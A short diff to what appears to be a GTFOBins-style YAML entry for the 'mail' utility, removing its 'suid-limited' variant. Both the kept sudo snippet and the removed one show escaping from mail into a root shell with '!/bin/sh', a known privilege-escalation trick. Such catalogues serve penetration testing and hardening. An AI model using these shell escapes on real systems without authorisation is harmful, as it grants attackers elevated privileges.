@@ -8,8 +8,4 @@ functions:
     - code: |
         sudo mail -f /etc/hosts
         !/bin/sh
-  suid-limited:
-    - code: |
-        ./mail -f /etc/hosts
-        !/bin/sh
 ---
